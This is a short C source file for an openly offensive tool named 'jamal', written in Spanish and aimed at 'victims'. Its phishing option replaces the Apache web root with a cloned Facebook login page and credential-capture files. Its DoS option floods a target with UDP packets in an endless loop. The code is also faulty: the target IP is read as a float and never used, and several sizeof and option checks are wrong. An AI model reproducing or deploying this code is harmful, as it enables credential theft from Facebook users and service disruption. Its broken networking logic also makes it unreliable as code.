//jamal 1 herramienta de phishing 

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

int port_dos;
float target_dos;
int main()
{
    printf("jamal\n");
    printf("(1)escaner de puertos\n");
    printf("(2)generador de payload\n");
    printf("(3)DoS\n");
    printf("(4)phishing\n");
    printf("(5)servidor web jamal");
    int opcion;
    scanf("%i",&opcion);
    int opcion2;
    switch (opcion)
    {
    case 4:
        system("rm /var/www/html/index.html");
        system("rm /var/www/html/index.nginx-debian.html");
        system("cp sites/facebook/es/index.html /var/www/html/");
        system("cp sites/facebook/es/ip.php /var/www/html/");
        system("cp sites/facebook/es/cuen.txt /var/www/html/");
        system("/etc/init.d/apache2 start");
        printf("\nel servidor apache esta corriendo\n");
        printf("tipee 1 para detener: ");
        scanf("%i",&opcion2);
        if (opcion2==2)
        {
          system("/etc/init.d/apache2 stop");
          system("se detuvo");
        }
        else
        {
            printf("/etc/init.d/apache2 stop para cerrar apache");
        }
        
        system("exit");
        break;
    case 3:
        printf("tipea la ip de la victima: ");
        scanf("%f",&target_dos);
        printf("tipea el puerto de la victima");
        scanf("%i",&port_dos);

        int client = socket(AF_INET,SOCK_DGRAM,0);    
        struct sockaddr_in adress;
        adress.sin_family = AF_INET;
        adress.sin_port = port_dos;
        adress.sin_addr.s_addr = INADDR_ANY;
        connect(client,(struct sockaddr *)&adress,sizeof(&adress));
        char request[]="DoS xD";
        while (1)
        {
            send(client,request,sizeof(&request),0);
        }
        
        
        
    default:
        printf("eliga una opcion valida: \n");
        break;
    }
}